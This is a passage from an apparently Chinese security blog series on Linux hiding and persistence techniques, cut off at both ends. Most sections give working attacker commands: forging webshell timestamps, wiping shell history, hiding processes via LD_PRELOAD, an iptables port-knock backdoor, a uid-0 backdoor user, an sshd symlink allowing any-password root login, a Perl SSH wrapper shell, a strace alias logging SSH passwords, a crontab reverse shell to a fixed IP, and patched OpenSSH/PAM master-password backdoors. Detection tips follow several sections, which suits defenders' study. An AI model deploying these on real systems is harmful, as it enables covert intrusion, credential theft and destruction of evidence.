隐藏文件</h3><p>Linux 下创建一个隐藏文件：<code>touch  .test.txt</code>  </p><p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p><p><img src="/image/privilege-2-1.png" srcset="/img/loading.gif" alt=""></p><p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p><p>这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p><h3 id="0x02-隐藏文件时间戳"><a href="#0x02-隐藏文件时间戳" class="headerlink" title="0x02 隐藏文件时间戳"></a>0x02 隐藏文件时间戳</h3><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p><p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p><p>利用方法</p><p>touch -r index.php webshell.php</p><p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-隐藏权限"><a href="#0x03-隐藏权限" class="headerlink" title="0x03 隐藏权限"></a>0x03 隐藏权限</h3><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p><pre><code class="hljs stylus">chattr +<span class="hljs-selector-tag">i</span> evil<span class="hljs-selector-class">.php</span> 锁定文件lsattr  evil<span class="hljs-selector-class">.php</span>   属性查看chattr -<span class="hljs-selector-tag">i</span> evil<span class="hljs-selector-class">.php</span> 解除锁定rm -rf <span class="hljs-number">1</span><span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.php</span>  删除文件</code></pre><p><img src="/image/privilege-2-2.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x04-隐藏历史操作命令"><a href="#0x04-隐藏历史操作命令" class="headerlink" title="0x04 隐藏历史操作命令"></a>0x04 隐藏历史操作命令</h3><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><pre><code class="hljs applescript">[<span class="hljs-literal">space</span>]<span class="hljs-keyword">set</span> +o history备注：[<span class="hljs-literal">space</span>] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</code></pre><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><pre><code class="hljs bash">[Space]<span class="hljs-built_in">set</span> -o <span class="hljs-built_in">history</span>它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</code></pre><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><pre><code class="hljs vim"><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">"keyword"</span></code></pre><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><pre><code class="hljs apache"><span class="hljs-attribute">history</span> -d<span class="hljs-meta"> [num]</span></code></pre><p><img src="/image/privilege-2-3.png" srcset="/img/loading.gif" alt=""></p><p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p><pre><code class="hljs nginx"><span class="hljs-attribute">sed</span> -i <span class="hljs-string">'150,<span class="hljs-variable">$d</span>'</span> .bash_history</code></pre><h3 id="0x05-隐藏远程SSH登陆记录"><a href="#0x05-隐藏远程SSH登陆记录" class="headerlink" title="0x05 隐藏远程SSH登陆记录"></a>0x05 隐藏远程SSH登陆记录</h3><p>#隐身登录系统，不会被w、who、last等指令检测到。</p><pre><code class="hljs angelscript">ssh -T <span class="hljs-symbol">root@</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> /bin/bash -i</code></pre><p>不记录ssh公钥在本地.ssh目录中</p><pre><code class="hljs groovy">ssh -o UserKnownHostsFile=<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> -T user<span class="hljs-meta">@host</span> <span class="hljs-regexp">/bin/</span>bash –i</code></pre><h3 id="0x06-端口复用"><a href="#0x06-端口复用" class="headerlink" title="0x06 端口复用"></a>0x06 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p><p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p><pre><code class="hljs yaml"><span class="hljs-comment">#安装SSLH</span><span class="hljs-string">sudo</span> <span class="hljs-string">apt-get</span> <span class="hljs-string">install</span> <span class="hljs-string">sslh</span><span class="hljs-comment">#配置SSLH</span><span class="hljs-string">编辑</span> <span class="hljs-string">SSLH</span> <span class="hljs-string">配置文件：</span><span class="hljs-string">sudo</span> <span class="hljs-string">vi</span> <span class="hljs-string">/etc/default/sslh</span><span class="hljs-number">1</span><span class="hljs-string">、找到下列行：Run=no</span>  <span class="hljs-string">将其修改为：Run=yes</span><span class="hljs-number">2</span><span class="hljs-string">、修改以下行以允许</span> <span class="hljs-string">SSLH</span> <span class="hljs-string">在所有可用接口上侦听端口</span> <span class="hljs-number">443</span><span class="hljs-string">DAEMON_OPTS="--user</span> <span class="hljs-string">sslh</span> <span class="hljs-string">--listen</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:443</span> <span class="hljs-string">--ssh</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:22</span> <span class="hljs-string">--ssl</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:443</span> <span class="hljs-string">--pidfile</span> <span class="hljs-string">/var/run/sslh/sslh.pid"</span></code></pre><p>第二种方式：利用IPTables进行端口复用</p><pre><code class="hljs routeros"><span class="hljs-comment"># 端口复用链</span>iptables -t<span class="hljs-built_in"> nat </span>-N LETMEIN<span class="hljs-comment"># 端口复用规则</span>iptables -t<span class="hljs-built_in"> nat </span> -A LETMEIN -p tcp -j REDIRECT --to-port 22<span class="hljs-comment"># 开启开关</span>iptables -A INPUT -p tcp -m string --string <span class="hljs-string">'threathuntercoming'</span> --algo bm -m recent --<span class="hljs-builtin-name">set</span> --name letmein --rsource -j ACCEPT<span class="hljs-comment"># 关闭开关</span>iptables -A INPUT -p tcp -m string --string <span class="hljs-string">'threathunterleaving'</span> --algo bm -m recent --name letmein --<span class="hljs-builtin-name">remove</span> -j ACCEPT<span class="hljs-comment"># let's do it</span>iptables -t<span class="hljs-built_in"> nat </span>-A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</code></pre><p>利用方式：</p><pre><code class="hljs angelscript">#开启复用echo threathuntercoming | socat - tcp:<span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.128</span>:<span class="hljs-number">80</span>#ssh使用<span class="hljs-number">80</span>端口进行登录ssh -p <span class="hljs-number">80</span> <span class="hljs-symbol">root@</span><span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.128</span>#关闭复用echo threathunterleaving | socat - tcp:<span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.128</span>:<span class="hljs-number">80</span></code></pre><p><img src="/image/privilege-2-4.png" srcset="/img/loading.gif" alt=""></p><p> 具体文章详见：<a href="https://www.freebuf.com/articles/network/137683.html" target="_blank" rel="noopener">远程遥控 IPTables 进行端口复用</a></p><h3 id="0x07-进程隐藏"><a href="#0x07-进程隐藏" class="headerlink" title="0x07 进程隐藏"></a>0x07 进程隐藏</h3><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p><p>第一种方法：libprocesshider</p><p>github项目地址：<a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a></p><p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p><pre><code class="hljs crystal"><span class="hljs-comment"># 下载程序编译</span>git clone <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/gianlucaborello</span><span class="hljs-regexp">/libprocesshider.git</span><span class="hljs-regexp">cd libprocesshider/</span> &amp;&amp; make<span class="hljs-comment"># 移动文件到/usr/local/lib/目录下</span>cp libprocesshider.so /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/</span><span class="hljs-comment"># 把它加载到全局动态连接局</span>echo /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">libprocesshider</span>.<span class="hljs-title">so</span> &gt;&gt; /<span class="hljs-title">etc</span>/<span class="hljs-title">ld</span>.<span class="hljs-title">so</span>.<span class="hljs-title">preload</span></span></code></pre><p>测试：运行 evil_script.py，</p><p><img src="/image/privilege-2-5.png" srcset="/img/loading.gif" alt=""></p><p>此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。</p><p><img src="/image/privilege-2-6.png" srcset="/img/loading.gif" alt=""></p><p>如何在Linux中发现隐藏的进程，</p><p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p><p>下载地址：<a href="http://www.unhide-forensics.info/" target="_blank" rel="noopener">http://www.unhide-forensics.info/</a></p><pre><code class="hljs properties"><span class="hljs-comment"># 安装</span><span class="hljs-attr">sudo</span> <span class="hljs-string">yum install unhide</span><span class="hljs-comment"># 使用</span><span class="hljs-attr">unhide</span> <span class="hljs-string">[options] test_list</span></code></pre><p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p><p><img src="/image/privilege-2-7.png" srcset="/img/loading.gif" alt=""></p><p>第二种方法：进程注入工具linux-inject</p><p>linux-inject是用于将共享对象注入Linux进程的工具</p><p>github项目地址： <a href="https://github.com/gaffe23/linux-inject.git" target="_blank" rel="noopener">https://github.com/gaffe23/linux-inject.git</a></p><pre><code class="hljs glsl"><span class="hljs-meta"># 下载程序编译</span>git clone https:<span class="hljs-comment">//github.com/gaffe23/linux-inject.git</span>cd linux-inject &amp;&amp; make<span class="hljs-meta"># 测试进程</span>./<span class="hljs-keyword">sample</span>-target<span class="hljs-meta"># 进程注入</span>./inject -n <span class="hljs-keyword">sample</span>-target <span class="hljs-keyword">sample</span>-library.so</code></pre><p>验证进程注入成功，如下图所示：</p><p><img src="/image/privilege-2-8.png" srcset="/img/loading.gif" alt=""></p><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p><p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/" target="_blank" rel="noopener">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><pre><code class="hljs awk"><span class="hljs-comment"># 下载解压</span>wget https:<span class="hljs-regexp">//</span>jaist.dl.sourceforge.net<span class="hljs-regexp">/project/</span>cymothoa<span class="hljs-regexp">/cymothoa-1-beta/</span>cymothoa-<span class="hljs-number">1</span>-beta.tar.gztar zxvf cymothoa-<span class="hljs-number">1</span>-beta.tar.gz <span class="hljs-comment"># </span>cd cymothoa-<span class="hljs-number">1</span>-beta &amp;&amp; make</code></pre><h3 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h3><p>本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。</p><p>参考文章：</p><p>Tiny Shell</p><p>这款工具通过在源码中设置PROCESS_NAME为bash，以使得其运行后的进程名显示为bash。<br>在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的。</p><p><a href="https://github.com/orangetw/tsh" target="_blank" rel="noopener">https://github.com/orangetw/tsh</a></p><p>参考文章：<a href="https://www.freebuf.com/sectool/138350.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/138350.html</a></p><p>mount-bind</p><p>利用mount —bind 将另外一个目录挂载覆盖至/proc/目录下指定进程ID的目录</p><p>聊一聊Linux下进程隐藏的常见手法及侦测手段<br><a href="https://www.anquanke.com/post/id/160843" target="_blank" rel="noopener">https://www.anquanke.com/post/id/160843</a></p><p>反入侵之发现后门利用mount-bind将进程和端口信息隐匿<br><a href="https://www.freebuf.com/articles/network/140535.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/140535.html</a></p><p><a href="https://blog.csdn.net/liuqz2009/article/details/43530201" target="_blank" rel="noopener">https://blog.csdn.net/liuqz2009/article/details/43530201</a><br>Linux 共享库注入后门</p><p>linux  进程注入后门工具Cymothoa</p><p>如何隐藏你的 Linux 的命令行历史<br><a href="https://www.linuxprobe.com/hidden-cmd-history.html" target="_blank" rel="noopener">https://www.linuxprobe.com/hidden-cmd-history.html</a></p><p>利用sslh实现端口复用<br><a href="https://www.bbsmax.com/A/QW5YwpWezm/" target="_blank" rel="noopener">https://www.bbsmax.com/A/QW5YwpWezm/</a></p><p>远程遥控 IPTables 进行端口复用<br><a href="https://www.freebuf.com/articles/network/137683.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/137683.html</a></p><p>Venom 多级代理工具</p><p>linux 下隐藏进程的一种方法及遇到的坑</p><p><a href="https://www.jb51.net/article/147024.htm" target="_blank" rel="noopener">https://www.jb51.net/article/147024.htm</a></p><p>如何在 Linux/Unix/Windows 中发现隐藏的进程和端口<br><a href="https://linux.cn/article-9288-1.html" target="_blank" rel="noopener">https://linux.cn/article-9288-1.html</a></p><h2 id="第4篇：Linux权限维持–后门篇"><a href="#第4篇：Linux权限维持–后门篇" class="headerlink" title="第4篇：Linux权限维持–后门篇"></a>第4篇：Linux权限维持–后门篇</h2><p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p><p><strong>1、一句话添加用户和密码</strong></p><p>添加普通用户：</p><pre><code class="hljs bash"><span class="hljs-comment"># 创建一个用户名guest，密码123456的普通用户</span>useradd -p `openssl passwd -1 -salt <span class="hljs-string">'salt'</span> 123456` guest<span class="hljs-comment"># useradd -p 方法  ` ` 是用来存放可执行的系统命令,"$()"也可以存放命令执行语句</span>useradd -p <span class="hljs-string">"<span class="hljs-variable">$(openssl passwd -1 123456)</span>"</span> guest<span class="hljs-comment"># chpasswd方法</span>useradd guest;<span class="hljs-built_in">echo</span> <span class="hljs-string">'guest:123456'</span>|chpasswd<span class="hljs-comment"># echo -e方法</span>useradd <span class="hljs-built_in">test</span>;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"123456\n123456\n"</span> |passwd <span class="hljs-built_in">test</span></code></pre><p>添加root用户：</p><pre><code class="hljs angelscript"># 创建一个用户名guest，密码<span class="hljs-number">123456</span>的root用户useradd -p `openssl passwd <span class="hljs-number">-1</span> -salt <span class="hljs-string">'salt'</span> <span class="hljs-number">123456</span>` guest -o -u <span class="hljs-number">0</span> -g root -G root -s /bin/bash -d /home/test</code></pre><p>可疑用户排查技巧：</p><pre><code class="hljs autoit"><span class="hljs-meta"># 查询特权用户特权用户(uid 为0)</span>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># awk -F: <span class="hljs-string">'$3==0{print $1}'</span> /etc/passwd</span><span class="hljs-meta"># 查询可以远程登录的帐号信息</span>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># awk <span class="hljs-string">'/\$1|\$6/{print $1}'</span> /etc/shadow</span><span class="hljs-meta"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># more /etc/sudoers | grep -v <span class="hljs-string">"^#\|^$"</span> | grep <span class="hljs-string">"ALL=(ALL)"</span></span></code></pre><p><strong>2、SUID Shell</strong></p><p>Suid shell是一种可用于以拥有者权限运行的shell。</p><pre><code class="hljs awk">配合普通用户权限使用cp <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/tmp/</span>shellchmod u+s <span class="hljs-regexp">/tmp/</span>shell</code></pre><p>使用guest用户登录就可疑获取root权限。</p><p><img src="/image/privilege-5-1.png" srcset="/img/loading.gif" alt=""></p><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p><p>排查技巧：</p><pre><code class="hljs routeros"><span class="hljs-comment"># 在Linux中查找SUID设置的文件</span><span class="hljs-builtin-name">find</span> . -perm /4000 <span class="hljs-comment"># 在Linux中查找使用SGID设置的文件</span><span class="hljs-builtin-name">find</span> . -perm /2000<span class="hljs-comment"># 取消s权限</span>chmod u-s /tmp/shell</code></pre><p><strong>3、ssh公私钥免密登录</strong></p><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p><p>客户端：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span></code></pre><p>过程中按三次回车，执行结束如下图:</p><p><img src="/image/privilege-5-2.png" srcset="/img/loading.gif" alt=""></p><p>进入/root/.ssh/文件夹，查看文件夹的内容，如下所示：</p><p><img src="/image/privilege-5-3.png" srcset="/img/loading.gif" alt=""></p><p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p><p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p><p><strong>4、软连接</strong></p><p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p><p>在目标服务器上执行一句话后门：</p><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/sshd /</span>tmp<span class="hljs-regexp">/su;/</span>tmp<span class="hljs-regexp">/su -oPort=8888</span></code></pre><p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p><p><img src="/image/privilege-5-4.png" srcset="/img/loading.gif" alt=""></p><p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p><p><img src="/image/privilege-5-4-1.png" srcset="/img/loading.gif" alt=""></p><p><strong>5、SSH wrapper</strong></p><p>首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p><p>服务端：</p><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/usr/sbin/</span>mv sshd <span class="hljs-string">../bin/</span><span class="hljs-keyword">echo</span> '<span class="hljs-comment">#!/usr/bin/perl' &gt;sshd</span><span class="hljs-keyword">echo</span> 'exec <span class="hljs-string">"/bin/sh"</span> <span class="hljs-keyword">if</span><span class="hljs-params">(getpeername(STDIN)</span> =~ /^<span class="hljs-string">..4A/</span>);' &gt;&gt;sshd<span class="hljs-keyword">echo</span> 'exec{<span class="hljs-string">"/usr/bin/sshd"</span>} <span class="hljs-string">"/usr/sbin/sshd"</span>,@ARGV,' &gt;&gt;sshdchmod u+x sshd<span class="hljs-string">/etc/init.d/sshd</span> restart</code></pre><p>客户端：</p><pre><code class="hljs ruby">socat STDIO <span class="hljs-symbol">TCP4:</span><span class="hljs-symbol">target_ip:</span><span class="hljs-number">22</span>,sourceport=<span class="hljs-number">13377</span><span class="hljs-comment">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><span class="hljs-meta">&gt;&gt;</span>&gt; import struct<span class="hljs-meta">&gt;&gt;</span>&gt; buffer = struct.pack(<span class="hljs-string">'&gt;I6'</span>,<span class="hljs-number">19526</span>)<span class="hljs-meta">&gt;&gt;</span>&gt; print repr(buffer)<span class="hljs-string">'\x00\x00LF'</span><span class="hljs-meta">&gt;&gt;</span>&gt; buffer = struct.pack(<span class="hljs-string">'&gt;I6'</span>,<span class="hljs-number">13377</span>)<span class="hljs-meta">&gt;&gt;</span>&gt; print buffer<span class="hljs-number">4</span>A</code></pre><p><img src="/image/privilege-5-5.png" srcset="/img/loading.gif" alt=""></p><p>排查技巧：</p><pre><code class="hljs vala"><span class="hljs-meta"># ls -al /usr/sbin/sshd</span><span class="hljs-meta"># cat /usr/sbin/sshd</span>可通过重装ssh服务恢复。</code></pre><p><strong>6、strace后门</strong></p><p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><pre><code class="hljs applescript"><span class="hljs-comment">#vim /etc/bashrc</span><span class="hljs-built_in">alias</span> ssh='strace -o /tmp/.ssh.<span class="hljs-built_in">log</span> -e <span class="hljs-built_in">read</span>,<span class="hljs-built_in">write</span>,connect -s <span class="hljs-number">2048</span> ssh'<span class="hljs-comment"># source /root/.bashrc</span></code></pre><p><img src="/image/privilege-5-5-1.png" srcset="/img/loading.gif" alt=""></p><p>排查技巧：使用<code>alias</code>即可发现异常。</p><p><img src="/image/privilege-5-5-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>7、crontab反弹shell</strong></p><p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p><p>a、创建shell脚本，例如在/etc/evil.sh</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</code></pre><p><code>chmod +sx /etc/evil.sh</code></p><p>b、crontab -e 设置定时任务</p><pre><code class="hljs markdown"><span class="hljs-section">#每一分钟执行一次</span><span class="hljs-emphasis">*/1 *</span> <span class="hljs-emphasis">* *</span> * root /etc/evil.sh</code></pre><p>重启crond服务，<code>service crond restart</code>，然后就可以用nc接收shell。</p><p><img src="/image/privilege-5-6.png" srcset="/img/loading.gif" alt=""></p><p>排查技巧：</p><pre><code class="hljs nginx"><span class="hljs-comment"># 查看可疑的定时任务列表</span><span class="hljs-attribute">crontab</span> -e</code></pre><p><strong>8、openssh后门</strong></p><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p><pre><code class="hljs gradle">a、备份SSH配置文件mv <span class="hljs-regexp">/etc/</span>ssh<span class="hljs-regexp">/ssh_config /</span>etc<span class="hljs-regexp">/ssh/</span>ssh_config.oldmv <span class="hljs-regexp">/etc/</span>ssh<span class="hljs-regexp">/sshd_config /</span>etc<span class="hljs-regexp">/ssh/</span>sshd_config.oldb、解压并安装补丁tar zxf openssh-<span class="hljs-number">5.9</span>p1.tar.gztar zxf openssh-<span class="hljs-number">5.9</span>p1.tar.gzcp openssh-<span class="hljs-number">5.9</span>p1.patch<span class="hljs-regexp">/sshbd5.9p1.diff  /</span>openssh-<span class="hljs-number">5.9</span>p1cd openssh-<span class="hljs-number">5.9</span>p1patch &lt; sshbd5.<span class="hljs-number">9</span>p1.diffc、记录用户名和密码的文件位置及其密码vi  <span class="hljs-keyword">includes</span>.h#define ILOG <span class="hljs-string">"/tmp/1.txt"</span>             <span class="hljs-comment">//记录登录本机的用户名和密码</span>#define OLOG <span class="hljs-string">"/tmp/2.txt"</span>             <span class="hljs-comment">//记录本机登录远程的用户名和密码</span>#define SECRETPW <span class="hljs-string">"123456789"</span>          <span class="hljs-comment">//后门的密码</span>d、修改版本信息vi version.h#define SSH_VERSION <span class="hljs-string">"填入之前记下来的版本号,伪装原版本"</span>#define SSH_PORTABLE <span class="hljs-string">"小版本号"</span>e、安装并编译.<span class="hljs-regexp">/configure --prefix=/u</span>sr --sysconfdir=<span class="hljs-regexp">/etc/</span>ssh --with-pam --with-kerberos5make cleanmake &amp;&amp; make installservice sshd restartf、对比原来的配置文件，使配置文件一致，然后修改文件日期。touch -r  <span class="hljs-regexp">/etc/</span>ssh<span class="hljs-regexp">/ssh_config.old /</span>etc<span class="hljs-regexp">/ssh/</span>ssh_configtouch -r  <span class="hljs-regexp">/etc/</span>ssh<span class="hljs-regexp">/sshd_config.old /</span>etc<span class="hljs-regexp">/ssh/</span>sshd_configg、清除操作记录export HISTFILE=<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>export HISTSIZE=<span class="hljs-number">0</span>echo &gt;<span class="hljs-regexp">/root/</span>.bash_history <span class="hljs-comment">//清空操作日志</span></code></pre><p>排查技巧：利用strace找出ssh后门.</p><pre><code class="hljs perl"><span class="hljs-comment"># 1、获取可疑进程PI</span>ps aux | <span class="hljs-keyword">grep</span> sshd<span class="hljs-comment"># 2、跟踪sshd PID</span>strace -o aa -ff -p  PID<span class="hljs-comment"># 3、查看记录密码打开文件</span><span class="hljs-keyword">grep</span> <span class="hljs-keyword">open</span> sshd* | <span class="hljs-keyword">grep</span> -v -e No -e  null -e denied| <span class="hljs-keyword">grep</span>  WR</code></pre><p><strong>9、PAM后门</strong></p><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p><p>利用方法:</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、获取目标系统所使用的PAM版本，下载对应版本的pam版本<span class="hljs-number">2</span>、解压缩，修改pam_unix_auth.c文件，添加万能密码<span class="hljs-number">3</span>、编译安装PAM<span class="hljs-number">4</span>、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</code></pre><p>排查技巧：</p><pre><code class="hljs crystal"><span class="hljs-comment"># 1、通过Strace跟踪ssh</span>ps axu | grep sshdstrace -o aa -ff -p PIDgrep open aa* | grep -v -e No -e null -e denied| grep WR<span class="hljs-comment"># 2、检查pam_unix.so的修改时间</span>stat /<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">security</span>/<span class="hljs-title">pam_unix</span>.<span class="hljs-title">so</span>      <span class="hljs-comment">#32位</span></span>stat /lib64/security/pam_unix.so    <span class="hljs-comment">#64位</span></code></pre><p><strong>10、rookit后门</strong></p><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p><p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p><p>连接后的截图：</p><p><img src="/image/privilege-5-7.png" srcset="/img/loading.gif" alt=""></p><p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p><p>参考链接：</p><p>LINUX的两种后门总结(suid shell与inetd)</p><p><a href="https://www.cnblogs.com/milantgh/p/3601812.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/3601812.html</a></p><p>linux后门总结</p><p><a href="https://www.cnblogs.com/zaqzzz/p/12099463.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/12099463.html</a></p><p><a href="https://www.secpulse.com/archives/100484.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/100484.html</a></p><p>linux各种一句话反弹shell总结</p><p><a href="https://yq.aliyun.com/articles/519250?type=2" target="_blank" rel="noopener">https://yq.aliyun.com/articles/519250?type=2</a></p><p>Linux OpenSSH后门的添加与防范</p><p><a href="https://yq.aliyun.com/articles/69350" target="_blank" rel="noopener">https://yq.aliyun.com/articles/69350</a></p><p>Linux后门整理合集</p><p><a href="https://www.cnblogs.com/maplered/p/9224617.html" target="_blank" rel="noopener">https://www.cnblogs.com/maplered/p/9224617.html</a></p><p><a href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html" target="_blank" rel="noopener">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></p><p>linux 后门</p><p><a href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/" target="_blank" rel="noopener">https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</a></p><h2 id="第5篇：Windows命令行文件下载方式汇总"><a href="#第5篇：Windows命令行文件下载方式汇总" class="headerlink" 